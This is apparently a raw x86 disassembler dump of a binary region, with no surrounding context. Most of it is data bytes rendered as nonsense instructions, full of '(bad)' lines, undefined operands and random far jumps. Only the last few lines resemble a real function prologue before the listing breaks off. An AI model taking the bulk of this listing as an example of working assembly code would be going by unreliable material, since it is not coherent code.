  420d28:	outs   dx,BYTE PTR ds:[esi]
  420d29:	jae    0x420da4
  420d2b:	shr    BYTE PTR [esi],1
  420d2d:	add    BYTE PTR cs:[ecx-0x67b2f0a5],0xc7
  420d35:	xor    BYTE PTR [edi+0x77],bh
  420d38:	inc    esp
  420d39:	imul   esp,edx,0x44bd39ea
  420d3f:	fild   WORD PTR [ebp-0x68]
  420d42:	test   BYTE PTR [esi+0x70],al
  420d45:	mov    dh,0xf5
  420d47:	(bad)  
  420d48:	aam    0x26
  420d4a:	mov    eax,ds:0xd6187c87
  420d4f:	and    eax,0xb5a4faf1
  420d54:	sbb    bh,bl
  420d56:	(bad)  
  420d57:	and    al,0x47
  420d59:	mov    ah,0x90
  420d5b:	jle    0x420d33
  420d5d:	and    DWORD PTR [esi],ecx
  420d5f:	xchg   dh,cl
  420d61:	dec    ebp
  420d62:	pop    ss
  420d63:	sub    eax,0xef972b43
  420d68:	mov    ?,WORD PTR [edi-0x6e]
  420d6b:	and    ah,cl
  420d6d:	mov    ebp,?
  420d6f:	push   ss
  420d70:	enter  0x5116,0xbf
  420d74:	nop
  420d75:	shl    DWORD PTR [ebx+0x2e03813f],1
  420d7b:	(bad)  
  420d7c:	into   
  420d7d:	outs   dx,DWORD PTR ds:[esi]
  420d7e:	nop
  420d7f:	jbe    0x420df3
  420d81:	rcr    DWORD PTR ds:0xc0cb6b3c,cl
  420d87:	xchg   ch,bl
  420d89:	lods   eax,DWORD PTR ds:[esi]
  420d8a:	rol    edx,cl
  420d8c:	xor    al,0x73
  420d8e:	or     esp,DWORD PTR [eax+0x2e52a6bb]
  420d94:	inc    ebp
  420d95:	es cmp cl,al
  420d98:	adc    DWORD PTR [esi+ecx*8+0x78a13add],edx
  420d9f:	inc    ebx
  420da0:	fld    DWORD PTR [edi+0x77b5d2ab]
  420da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420da7:	iret   
  420da8:	mov    DWORD PTR [ebx-0x3c],ebp
  420dab:	push   0x9cb389d9
  420db0:	int    0x21
  420db2:	ins    DWORD PTR es:[edi],dx
  420db3:	and    al,0x39
  420db5:	aaa    
  420db6:	aaa    
  420db7:	xchg   BYTE PTR [edi+0xf3bc0e9],ah
  420dbd:	out    0xa4,eax
  420dbf:	xchg   BYTE PTR [edi+0x2d8cdc35],al
  420dc5:	and    eax,0xcf4654fb
  420dca:	out    dx,al
  420dcb:	pop    ds
  420dcc:	mov    DWORD PTR [eax+0x4d],eax
  420dcf:	sub    al,0x7b
  420dd1:	sub    dl,bh
  420dd3:	pop    ecx
  420dd4:	xor    al,0x1
  420dd6:	xchg   ebp,eax
  420dd7:	dec    edx
  420dd8:	xchg   esp,eax
  420dd9:	sbb    al,0x24
  420ddb:	jns    0x420da9
  420ddd:	pop    edx
  420dde:	(bad)  
  420ddf:	js     0x420d6d
  420de1:	jmp    0xd20f2050
  420de6:	cdq    
  420de7:	xchg   ebx,eax
  420de8:	std    
  420de9:	jnp    0x420d79
  420deb:	ss mov ebx,0x314ec943
  420df1:	test   DWORD PTR [edi+eax*4],esp
  420df4:	mov    ds:0x584a3ae1,al
  420df9:	out    0x14,eax
  420dfb:	adc    dh,0xf3
  420dfe:	or     ebp,DWORD PTR [edi-0x49]
  420e01:	sahf   
  420e02:	aam    0xa1
  420e04:	std    
  420e05:	cmp    eax,0xad29607e
  420e0a:	mov    eax,ds:0xa7b8be35
  420e0f:	sub    edx,0xffffffd7
  420e12:	cmc    
  420e13:	call   0xe92d646
  420e18:	mov    ebp,0x2f46a78f
  420e1d:	push   esi
  420e1e:	or     DWORD PTR [eax+0x49],eax
  420e21:	fcomp  st(7)
  420e23:	adc    BYTE PTR [esi-0x58f108c5],bl
  420e29:	stos   BYTE PTR es:[edi],al
  420e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e2b:	aad    0xbc
  420e2d:	(bad)  
  420e2f:	inc    ebx
  420e30:	std    
  420e31:	js     0x420df3
  420e33:	popf   
  420e34:	adc    ah,0x6f
  420e37:	inc    edi
  420e38:	push   ecx
  420e39:	jge    0x420e89
  420e3b:	outs   dx,BYTE PTR ds:[esi]
  420e3c:	dec    ecx
  420e3d:	test   al,0xa1
  420e3f:	test   DWORD PTR [ecx],0x17a21a70
  420e45:	aas    
  420e46:	jmp    0x4bbf:0x48e66b5a
  420e4d:	mov    eax,DWORD PTR [ebx+ecx*8-0x62]
  420e51:	and    DWORD PTR [edi],0x7
  420e54:	xchg   edi,eax
  420e55:	adc    BYTE PTR [ecx+0x4e],al
  420e58:	adc    al,0x45
  420e5a:	and    bh,BYTE PTR [ecx+0x3bd66256]
  420e60:	push   eax
  420e61:	retf   0x3f18
  420e64:	out    dx,eax
  420e65:	add    al,0x2e
  420e67:	pop    eax
  420e68:	xchg   BYTE PTR [eax+0x4b],dl
  420e6b:	in     al,dx
  420e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e6d:	and    dl,0x59
  420e70:	push   ds
  420e71:	call   0x6cb6da40
  420e76:	shl    BYTE PTR [eax],cl
  420e78:	add    BYTE PTR [eax-0x31],dh
  420e7b:	clc    
  420e7c:	xchg   ebp,eax
  420e7d:	ret    
  420e7e:	in     al,0x8
  420e80:	leave  
  420e81:	pop    ebp
  420e82:	pop    edi
  420e83:	adc    DWORD PTR [esp+edi*4],edx
  420e86:	adc    al,0xb2
  420e88:	mov    dl,0xbc
  420e8a:	mov    ah,0xc5
  420e8c:	popf   
  420e8d:	pop    ebx
  420e8e:	pushf  
  420e8f:	call   0xb3aa6b4c
  420e94:	repz cld 
  420e96:	dec    esp
  420e97:	mov    ebx,0xb1c83313
  420e9c:	scas   eax,DWORD PTR es:[edi]
  420e9d:	jle    0x420e55
  420e9f:	fsubp  st(0),st
  420ea1:	xchg   esp,eax
  420ea2:	adc    eax,0x8106b278
  420ea7:	pop    es
  420ea8:	test   al,0x70
  420eaa:	mov    ebx,0x10e2f31c
  420eaf:	mov    BYTE PTR [ebx+0xb775b40],al
  420eb5:	loopne 0x420f29
  420eb7:	sub    cl,BYTE PTR [edx+edi*1]
  420eba:	cmp    BYTE PTR [edi-0x63],al
  420ebd:	jnp    0x420e8f
  420ebf:	or     bh,BYTE PTR [esi]
  420ec1:	ret    
  420ec2:	jns    0x420e74
  420ec4:	gs inc eax
  420ec6:	mov    ah,0x91
  420ec8:	adc    eax,0xcbdcc43c
  420ecd:	mov    edx,0xc432f7ca
  420ed2:	sbb    ecx,DWORD PTR [edx+0x7c]
  420ed5:	mov    ds:0x27feac36,eax
  420eda:	fdivr  DWORD PTR cs:[ebx+0x34]
  420ede:	dec    ebx
  420edf:	fstp   TBYTE PTR [esi-0x3583a22e]
  420ee5:	add    ch,al
  420ee7:	paddd  mm3,QWORD PTR [esi-0x69]
  420eeb:	xchg   ebp,eax
  420eec:	aam    0x71
  420eee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eef:	jl     0x420e72
  420ef1:	mov    bh,0x4a
  420ef3:	pop    eax
  420ef4:	sub    eax,0x2a117b93
  420ef9:	outs   dx,BYTE PTR ds:[esi]
  420efa:	pusha  
  420efb:	fstp   QWORD PTR [esi-0x3b]
  420efe:	mov    ds:0xc60f782a,al
  420f03:	jl     0x420ed2
  420f05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f06:	in     al,0xc1
  420f08:	sbb    eax,0x3dfbcee4
  420f0d:	jmp    0x420f19
  420f0f:	pop    ss
  420f10:	sbb    DWORD PTR [ebp+ebp*8-0x61],0xffffffe4
  420f15:	sti    
  420f16:	xor    BYTE PTR [edx],al
  420f18:	adc    cl,BYTE PTR [ebp+0x17]
  420f1b:	daa    
  420f1c:	xchg   DWORD PTR [edx-0x3322c330],ecx
  420f22:	pop    ss
  420f23:	mov    esp,0x184cbc4
  420f28:	push   ss
  420f29:	jle    0x420ef5
  420f2b:	loopne 0x420eca
  420f2d:	retf   0x78f6
  420f30:	push   cs
  420f31:	xchg   ebp,eax
  420f32:	adc    DWORD PTR [eax-0x7fb15e68],ebx
  420f38:	jl     0x420f8e
  420f3a:	shl    DWORD PTR [esi-0x151aaa02],cl
  420f40:	xchg   edx,eax
  420f41:	pop    edi
  420f42:	jb     0x420f83
  420f44:	in     al,dx
  420f45:	enter  0x2fdd,0x5d
  420f49:	repnz jecxz 0x420fa3
  420f4c:	pop    esi
  420f4d:	jl     0x420fc3
  420f4f:	into   
  420f50:	pop    esi
  420f51:	xor    bh,BYTE PTR [esi+edx*1]
  420f54:	addr16 dec edi
  420f56:	pop    eax
  420f57:	call   0x7446:0x503d259e
  420f5e:	pop    eax
  420f5f:	xchg   ebx,eax
  420f60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f61:	jns    0x420f5d
  420f63:	xor    edx,DWORD PTR [edx-0x50]
  420f66:	mov    esi,0xf7a220a8
  420f6b:	pusha  
  420f6c:	cld    
  420f6d:	rcr    DWORD PTR [edx+0x479cb8ae],cl
  420f73:	mov    ds:0xdfc07392,eax
  420f78:	mov    bl,0xc3
  420f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f7b:	add    al,0xe4
  420f7d:	cmc    
  420f7e:	sub    eax,0x5e092499
  420f83:	jle    0x420fc8
  420f85:	add    BYTE PTR [eax-0xe373d7],ch
  420f8b:	or     cl,al
  420f8d:	imul   ebp,DWORD PTR [esi],0xffffff92
  420f90:	pop    esp
  420f91:	inc    ebp
  420f92:	leave  
  420f93:	xchg   BYTE PTR [eax+eiz*2-0x36],al
  420f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f98:	adc    bh,BYTE PTR [ecx-0xc]
  420f9b:	mov    bh,BYTE PTR [ecx]
  420f9d:	sub    al,0x6a
  420f9f:	(bad)  
  420fa0:	jno    0x420fd2
  420fa2:	inc    esi
  420fa3:	or     ebp,DWORD PTR [ebx]
  420fa5:	aaa    
  420fa6:	mov    DWORD PTR [ebx],ebx
  420fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fa9:	pop    esp
  420faa:	loop   0x421004
  420fac:	xor    eax,DWORD PTR [ebx+0xf]
  420faf:	adc    eax,0xa259719c
  420fb4:	adc    al,0x73
  420fb6:	test   BYTE PTR ds:0x54d59575,dh
  420fbc:	jnp    0x420fe9
  420fbe:	fwait
  420fbf:	shr    DWORD PTR [ebx-0x3f],cl
  420fc2:	inc    esi
  420fc3:	mov    ds,WORD PTR [esi]
  420fc5:	dec    ebp
  420fc6:	xchg   ecx,eax
  420fc7:	ror    DWORD PTR ds:0x94e5d4a1,cl
  420fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fce:	push   ss
  420fcf:	ficomp WORD PTR [ecx+0x7a]
  420fd2:	cmp    BYTE PTR [ebx-0x1af28745],dl
  420fd8:	sbb    esp,DWORD PTR [ebx]
  420fda:	xchg   eax,ebp
  420fdc:	fwait
  420fdd:	pop    esi
  420fde:	jae    0x421044
  420fe0:	mov    ds:0xf57a8e64,al
  420fe5:	jb     0x420f99
  420fe7:	xchg   ecx,eax
  420fe8:	and    edi,0xe1a0925e
  420fee:	xchg   ecx,eax
  420fef:	or     BYTE PTR [edx+0x5c],ch
  420ff2:	arpl   WORD PTR [edx],dx
  420ff4:	sbb    ebx,DWORD PTR [ebx+0x20b16cd]
  420ffa:	shl    DWORD PTR [edx+0x4f98fa0],cl
  421000:	and    eax,0x40c4de91
  421005:	pop    ds
  421006:	sub    bl,BYTE PTR [edx+0x76]
  421009:	addr16 pusha 
  42100b:	or     BYTE PTR [ebp-0x2a6f1aa0],bh
  421011:	fisub  DWORD PTR [ecx]
  421013:	sahf   
  421014:	add    al,0x78
  421016:	ret    0x33f2
  421019:	fcmove st,st(2)
  42101b:	or     BYTE PTR [esi-0x1b85e33e],ah
  421021:	sbb    DWORD PTR [edx],ebx
  421023:	push   ebx
  421024:	rol    DWORD PTR [ecx-0x59],cl
  421027:	je     0x42104a
  421029:	xlat   BYTE PTR ds:[ebx]
  42102a:	daa    
  42102b:	call   0xb37db2b0
  421030:	push   ecx
  421031:	in     al,0x5a
  421033:	jnp    0x421091
  421035:	mov    esp,DWORD PTR [esi+0x741370d]
  42103b:	or     cl,BYTE PTR [ebx-0x16]
  42103e:	ins    BYTE PTR es:[edi],dx
  42103f:	add    BYTE PTR [ecx+0x2915f933],bl
  421045:	aas    
  421046:	xchg   edx,eax
  421047:	fsub   QWORD PTR [ebp+0x675d03b2]
  42104d:	adc    esp,DWORD PTR [edx]
  42104f:	ret    
  421050:	inc    ecx
  421051:	jg     0x42105e
  421053:	add    eax,0xe22639be
  421058:	out    0xc8,eax
  42105a:	push   0xffffffc7
  42105c:	mov    esi,0x131818d4
  421061:	adc    dh,cl
  421063:	inc    esp
  421064:	dec    ecx
  421065:	clc    
  421066:	ficom  WORD PTR [edx-0x29e4d8e9]
  42106c:	push   edx
  42106d:	xor    al,0x61
  42106f:	stc    
  421070:	or     DWORD PTR [ebx],edx
  421072:	push   ds
  421073:	pop    eax
  421074:	popa   
  421075:	aam    0x7
  421077:	sar    bl,0x15
  42107a:	add    dl,bl
  42107c:	mov    edx,0x30ffa439
  421081:	mov    ?,WORD PTR [eax]
  421083:	aas    
  421084:	mov    esp,0xcf2256d1
  421089:	cmp    bl,ah
  42108b:	jp     0x4210b5
  42108d:	inc    DWORD PTR [eax+0x65876847]
  421093:	outs   dx,BYTE PTR ds:[esi]
  421094:	retf   0x91ea
  421097:	adc    BYTE PTR [eax+0x75a6671d],bl
  42109d:	out    0x82,eax
  42109f:	push   cs
  4210a0:	xchg   BYTE PTR [edx-0x77],cl
  4210a3:	mov    al,0xeb
  4210a5:	sub    eax,0xf9b3f9ea
  4210aa:	fdiv   st(2),st
  4210ac:	mov    bl,0x92
  4210ae:	jno    0x42109a
  4210b0:	ss (bad) 
  4210b2:	xchg   ebx,eax
  4210b3:	pop    ds
  4210b4:	shl    DWORD PTR [ecx-0x16],0xf1
  4210b8:	add    BYTE PTR [edi+0x26],bh
  4210bb:	in     eax,0xca
  4210bd:	mov    esp,0x94246a98
  4210c2:	adc    ebx,DWORD PTR [ecx+0x5ddba7a4]
  4210c8:	mov    eax,ds:0xbb63b5bf
  4210cd:	xchg   esp,eax
  4210ce:	sub    al,BYTE PTR [esi]
  4210d0:	sub    edi,DWORD PTR [edi-0x55]
  4210d3:	es test al,0x60
  4210d6:	add    al,0x66
  4210d8:	leave  
  4210d9:	mov    ds:0xc6f66d82,eax
  4210de:	mov    edx,0x269bc40e
  4210e3:	int3   
  4210e4:	cdq    
  4210e5:	add    BYTE PTR [eax],bl
  4210e7:	jl     0x4210b6
  4210e9:	aaa    
  4210ea:	push   eax
  4210eb:	sbb    DWORD PTR [eax-0xa],ebp
  4210ee:	inc    ebp
  4210ef:	sub    BYTE PTR [ebp+0x4d],cl
  4210f2:	repz inc ebp
  4210f4:	fist   WORD PTR [edi+0x3b]
  4210f7:	test   al,al
  4210f9:	pop    ebp
  4210fa:	out    dx,al
  4210fb:	adc    edi,DWORD PTR [edi+0x65]
  4210fe:	inc    ecx
  4210ff:	scas   eax,DWORD PTR es:[edi]
  421100:	in     eax,0x4
  421102:	pop    eax
  421103:	or     al,0xae
  421105:	sbb    al,0x14
  421107:	sub    edi,DWORD PTR [ebp+0x10]
  42110a:	mov    ebx,0xe918da46
  42110f:	std    
  421110:	adc    al,0xb3
  421112:	xor    DWORD PTR [ebp+0x3ecdd255],0xffffffef
  421119:	call   DWORD PTR [edi-0x1d19aad2]
  42111f:	cmp    bh,ch
  421121:	jbe    0x4210fa
  421123:	xlat   BYTE PTR ds:[ebx]
  421124:	adc    ebx,ebx
  421126:	and    ah,ch
  421128:	mov    bh,0x8d
  42112a:	shl    DWORD PTR [ebx+0x4b9bb11f],cl
  421130:	mov    ebp,DWORD PTR [edx-0x706c4adb]
  421136:	lock push ecx
  421138:	jno    0x42115f
  42113a:	mov    ebx,0xd4e273cf
  42113f:	jae    0x4210de
  421141:	das    
  421142:	ins    BYTE PTR es:[edi],dx
  421143:	iret   
  421144:	outs   dx,DWORD PTR ds:[esi]
  421145:	loop   0x42118b
  421147:	mov    BYTE PTR [ecx+0x44],dl
  42114a:	inc    esi
  42114b:	dec    eax
  42114c:	mov    ch,BYTE PTR [ecx+eiz*1-0x768f107f]
  421153:	test   eax,0xc6302494
  421158:	and    DWORD PTR [edx],0x9235fc33
  42115e:	scas   eax,DWORD PTR es:[edi]
  42115f:	add    eax,0x61d94ab3
  421164:	daa    
  421165:	addr16 out dx,al
  421167:	inc    ebx
  421168:	sbb    eax,0xb22697b5
  42116d:	sbb    BYTE PTR [edi-0x27],bl
  421170:	and    al,0x7a
  421172:	shl    DWORD PTR [edx+0x20],0x17
  421176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421177:	lahf   
  421178:	jb     0x421182
  42117a:	xchg   ecx,eax
  42117b:	jmp    0x1506:0xc4c02fa7
  421182:	adc    bh,0x94
  421185:	dec    esi
  421186:	push   edi
  421187:	or     BYTE PTR [ebx+0x17a2562],cl
  42118d:	repnz xor eax,0xbe85e409
  421193:	dec    edx
  421194:	mov    esp,0x6b0ceac4
  421199:	or     eax,0xd750ae32
  42119e:	mov    BYTE PTR [esi-0x5c],dl
  4211a1:	adc    eax,esp
  4211a3:	enter  0x9491,0xac
  4211a7:	push   ss
  4211a8:	inc    esi
  4211a9:	jns    0x421140
  4211ab:	add    ch,bl
  4211ad:	push   0x1a
  4211af:	mov    al,ds:0x75679d39
  4211b4:	repnz scas eax,DWORD PTR es:[edi]
  4211b6:	xor    edx,DWORD PTR [edx+0x742a9d7b]
  4211bc:	leave  
  4211bd:	daa    
  4211be:	mov    cl,BYTE PTR [eax]
  4211c0:	pop    esi
  4211c1:	test   eax,0xfc8bdf33
  4211c6:	pop    ss
  4211c7:	repz push edi
  4211c9:	pusha  
  4211ca:	mov    ebp,0xa69d929c
  4211cf:	icebp  
  4211d0:	in     eax,0x6e
  4211d2:	push   cs
  4211d3:	popf   
  4211d4:	call   0x1db4526e
  4211d9:	(bad)  
  4211da:	lds    ebx,FWORD PTR [ebp+edi*1-0x67b57e2c]
  4211e1:	sbb    eax,0x4e28de53
  4211e6:	lahf   
  4211e7:	adc    edi,DWORD PTR [ebp-0x6a]
  4211ea:	arpl   WORD PTR [esi+0x5cfffa24],bp
  4211f0:	jnp    0x4211f3
  4211f2:	xchg   edi,eax
  4211f3:	stos   DWORD PTR es:[edi],eax
  4211f4:	pop    edi
  4211f5:	mov    DWORD PTR [ebp+0x43615847],edi
  4211fb:	int    0x22
  4211fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211fe:	xor    eax,0xb7524bdd
  421203:	dec    ecx
  421204:	jae    0x4211b3
  421206:	test   ecx,esi
  421208:	dec    edx
  421209:	ds es jle 0x421195
  42120d:	sahf   
  42120e:	xchg   esi,eax
  421210:	outs   dx,BYTE PTR ds:[esi]
  421211:	sbb    al,0x8c
  421213:	out    0x12,eax
  421215:	in     eax,dx
  421216:	call   0xf87e:0x23d955ab
  42121d:	test   BYTE PTR ds:0xe4cf9cd9,0xb2
  421224:	(bad)  
  421226:	mov    ah,0xf5
  421228:	push   0xb52fd978
  42122d:	out    0x13,al
  42122f:	dec    eax
  421230:	and    eax,0x60de249c
  421235:	les    ebx,FWORD PTR [ebx+0x3a]
  421238:	je     0x4211e6
  42123a:	jo     0x4211ea
  42123c:	loop   0x421296
  42123e:	clc    
  42123f:	pop    ecx
  421240:	mov    WORD PTR [eax+0x3a],?
  421243:	das    
  421244:	add    eax,0x12123237
  421249:	call   0x251d:0xfe7aaf11
  421250:	(bad)  
  421251:	out    0xa2,eax
  421253:	xchg   esp,eax
  421254:	call   0xec1c:0xfaeea5ed
  42125b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42125c:	test   al,0x13
  42125e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42125f:	cwde   
  421260:	imul   edi,DWORD PTR [ecx+edi*2-0x12],0x1c
  421265:	mov    al,ds:0x290d1b5c
  42126a:	push   ds
  42126b:	idiv   BYTE PTR [eax]
  42126d:	xchg   ch,dh
  42126f:	push   cs
  421270:	retf   
  421271:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  421273:	(bad)  
  421274:	in     al,0xcd
  421276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421277:	jge    0x4211f9
  421279:	xor    dh,BYTE PTR ss:[ebx+0x73]
  42127d:	iret   
  42127e:	loop   0x4212c7
  421280:	mov    ebx,0xb9165348
  421285:	sub    DWORD PTR ds:[esi-0x63704222],eax
  42128c:	adc    bh,BYTE PTR [ebx-0x1f8d107]
  421292:	jo     0x4212ee
  421294:	(bad)  
  421295:	loope  0x4212ec
  421297:	push   ebx
  421298:	and    cl,dh
  42129a:	ins    DWORD PTR es:[edi],dx
  42129b:	sub    al,cl
  42129d:	push   ds
  42129e:	test   BYTE PTR [esi+0x6e],bl
  4212a1:	rol    BYTE PTR [ebx-0x554bc1f2],1
  4212a7:	fcom   DWORD PTR [esi]
  4212a9:	outs   dx,BYTE PTR ds:[esi]
  4212aa:	jb     0x4212a5
  4212ac:	pop    ebx
  4212ad:	(bad)  
  4212ae:	mov    dl,dh
  4212b0:	pop    ds
  4212b1:	pushf  
  4212b2:	sahf   
  4212b3:	imul   esi,DWORD PTR [eax+0x662314c],0x15
  4212ba:	mov    DWORD PTR [edi+ebx*1-0x5b],esp
  4212be:	(bad)  
  4212bf:	sub    ebx,DWORD PTR [esi+edi*8+0x6e]
  4212c3:	bound  ebp,QWORD PTR [ebp-0x7578263d]
  4212c9:	mov    eax,eax
  4212cb:	mov    ds,WORD PTR [eax]
  4212cd:	retf   
  4212ce:	push   ebp
  4212cf:	pusha  
  4212d0:	daa    
  4212d1:	mov    edi,0xda586b86
  4212d6:	shl    DWORD PTR [ecx],1
  4212d8:	nop
  4212d9:	lock mov esi,DWORD PTR [edx+0x80c5383]
  4212e0:	imul   ebx,DWORD PTR [edi+0x17],0x18012df6
  4212e7:	jbe    0x42133e
  4212e9:	gs dec esi
  4212eb:	mov    cl,0xce
  4212ed:	dec    esi
  4212ee:	out    dx,eax
  4212ef:	(bad)  
  4212f0:	nop
  4212f1:	fld    st(4)
  4212f3:	jle    0x421314
  4212f5:	daa    
  4212f6:	inc    ebx
  4212f7:	pop    ebp
  4212f8:	mov    edi,0x81fbb696
  4212fd:	jne    0x4212ad
  4212ff:	push   cs
  421300:	push   edx
  421301:	fisubr DWORD PTR [edi-0x77fbfba5]
  421307:	pop    ecx
  421308:	pop    edi
  421309:	stos   BYTE PTR es:[edi],al
  42130a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42130b:	popw   ds
  42130d:	sub    ch,0x79
  421310:	aam    0xb
  421312:	rol    DWORD PTR [edx],1
  421314:	adc    al,0x7c
  421316:	clc    
  421317:	rcl    BYTE PTR [edi+0x5dce3137],cl
  42131d:	dec    eax
  42131e:	inc    esi
  42131f:	fistp  WORD PTR [edx]
  421321:	sub    al,0x7f
  421323:	xchg   esp,eax
  421324:	mov    al,0xad
  421326:	ins    BYTE PTR es:[edi],dx
  421327:	adc    BYTE PTR [ecx-0x3a76f488],0x8e
  42132e:	pop    esi
  42132f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421330:	sub    al,0x0
  421332:	and    bh,BYTE PTR [edx-0x40be7e16]
  421338:	xchg   BYTE PTR [edx-0x1e27d9e],al
  42133e:	cdq    
  42133f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421340:	mov    al,ds:0xe4c5dee2
  421345:	mov    al,0xf7
  421347:	arpl   WORD PTR [eax],bp
  421349:	shr    DWORD PTR [ebp-0xf],cl
  42134c:	cmp    al,0x51
  42134e:	add    ch,BYTE PTR [ecx-0x298bc673]
  421354:	adc    eax,0x2c088002
  421359:	jb     0x4212ff
  42135b:	sbb    eax,DWORD PTR [ebx-0x2a]
  42135e:	pushf  
  42135f:	int3   
  421360:	mov    ah,0x4e
  421362:	cli    
  421363:	jns    0x421322
  421365:	shr    bl,1
  421367:	add    al,cl
  421369:	test   BYTE PTR [eax],dl
  42136b:	mov    ah,0x31
  42136d:	pop    ss
  42136e:	mov    ecx,0xd05c23d6
  421373:	(bad)
  421377:	push   0x4b
  421379:	pop    es
  42137a:	mov    eax,ds:0x7df6b220
  42137f:	jae    0x421319
  421381:	repnz and BYTE PTR [edx+0x5267835b],al
  421388:	adc    eax,0x2de18cfa
  42138d:	lahf   
  42138e:	xor    DWORD PTR [esi],eax
  421390:	imul   BYTE PTR [ecx]
  421392:	jno    0x4213e2
  421394:	inc    esp
  421395:	outs   dx,DWORD PTR ds:[esi]
  421396:	into   
  421397:	(bad)  
  421398:	push   0x6e
  42139a:	add    eax,0x7aaeeddd
  42139f:	(bad)  
  4213a0:	mov    BYTE PTR [edi-0x66],0x59
  4213a4:	lds    ebx,FWORD PTR [esi+0x2fd651ce]
  4213aa:	sbb    eax,0xf8b52845
  4213af:	into   
  4213b0:	and    edi,DWORD PTR ds:0x176dd22b
  4213b6:	adc    esp,DWORD PTR ds:0x65ad275a
  4213bc:	xchg   edi,eax
  4213bd:	out    0x87,eax
  4213bf:	or     ch,ah
  4213c1:	lods   eax,DWORD PTR ds:[esi]
  4213c2:	jns    0x4213dd
  4213c4:	enter  0x4d37,0x3b
  4213c8:	or     dl,ah
  4213ca:	push   ss
  4213cb:	cmc    
  4213cc:	adc    bl,0x69
  4213cf:	jbe    0x4213b3
  4213d1:	in     al,dx
  4213d2:	jno    0x4213b0
  4213d4:	(bad)  
  4213d5:	loopne 0x4213f7
  4213d7:	popf   
  4213d8:	lods   eax,DWORD PTR ds:[esi]
  4213d9:	jb     0x42139e
  4213db:	dec    ebp
  4213dc:	dec    esi
  4213dd:	cld    
  4213de:	jae    0x42140a
  4213e0:	xor    edx,DWORD PTR [ebx-0x3e4151d5]
  4213e6:	sar    BYTE PTR [edx],1
  4213e8:	jns    0x42138e
  4213ea:	sti    
  4213eb:	aam    0x78
  4213ed:	dec    eax
  4213ee:	shl    DWORD PTR [edx-0x20860bab],1
  4213f4:	push   ss
  4213f5:	cld    
  4213f6:	adc    DWORD PTR [esi-0x10],ebx
  4213f9:	les    ebp,FWORD PTR [ebp+0x73]
  4213fc:	and    BYTE PTR [ebx+esi*4-0x46ef38a4],al
  421403:	cdq    
  421404:	jnp    0x421402
  421406:	jg     0x421471
  421408:	jnp    0x42138e
  42140a:	and    BYTE PTR [ecx],bh
  42140c:	dec    ebp
  42140d:	mov    ch,0x9a
  42140f:	pop    ds
  421410:	les    eax,FWORD PTR [edx+ecx*2-0x4ad1d4ae]
  421417:	call   0xcceb:0x798215d4
  42141e:	int3   
  42141f:	and    eax,0xc96faa54
  421424:	fs in  al,0xc1
  421427:	aaa    
  421428:	add    BYTE PTR [ebp+0x6e2c0627],0xfe
  42142f:	div    DWORD PTR [edi]
  421431:	into   
  421432:	nop
  421433:	lea    edx,[edi]
  421435:	dec    ebp
  421436:	dec    esp
  421437:	inc    esi
  421439:	stos   BYTE PTR es:[edi],al
  42143a:	popa   
  42143b:	jg     0x421465
  42143d:	push   ds
  42143e:	push   esi
  42143f:	imul   edi,DWORD PTR [esi+0x33],0x3d3077d4
  421446:	mov    esi,0xcfb7cdb0
  42144b:	fs mov ebx,0xf4384ec0
  421451:	pop    edx
  421452:	out    dx,al
  421453:	(bad)  [ecx-0x742969b9]
  421459:	mov    ecx,0x30eb24f2
  42145e:	mov    bl,0x37
  421460:	or     al,0x88
  421462:	retf   0xab36
  421465:	push   ss
  421466:	retf   
  421467:	imul   edi,DWORD PTR [edi],0xfffffff3
  42146a:	jb     0x4213f5
  42146c:	or     bh,BYTE PTR ds:0x34d5a2b6
  421472:	ret    
  421473:	cld    
  421474:	jecxz  0x4214c9
  421476:	adc    BYTE PTR [ebx],dh
  421478:	cmp    al,0x57
  42147a:	or     BYTE PTR [edx-0x6bb5855d],bl
  421480:	adc    BYTE PTR cs:[ebx+ebp*4-0x4b],cl
  421485:	pop    edi
  421486:	mov    edx,0x15f13d4d
  42148b:	jecxz  0x421473
  42148d:	adc    al,bl
  42148f:	sub    DWORD PTR [ecx-0x49390f10],esp
  421495:	ret    0x28ce
  421498:	cld    
  421499:	in     eax,dx
  42149a:	mov    ebx,0x222614bd
  42149f:	push   eax
  4214a0:	imul   edi,edi,0xffb6560f
  4214a6:	shl    DWORD PTR ds:0x78ebda7f,1
  4214ac:	or     al,0x3c
  4214ae:	fwait
  4214af:	cld    
  4214b0:	xor    edi,DWORD PTR [eax+0x19]
  4214b3:	mov    esp,0x995d3f5e
  4214b8:	xor    DWORD PTR [ebx+0x2f],esi
  4214bb:	cmp    eax,0x29b18ba8
  4214c0:	add    eax,DWORD PTR [ecx]
  4214c2:	sub    edx,DWORD PTR [eax+0x13]
  4214c5:	inc    edx
  4214c6:	idiv   BYTE PTR gs:[esi-0x6f3c3fcd]
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
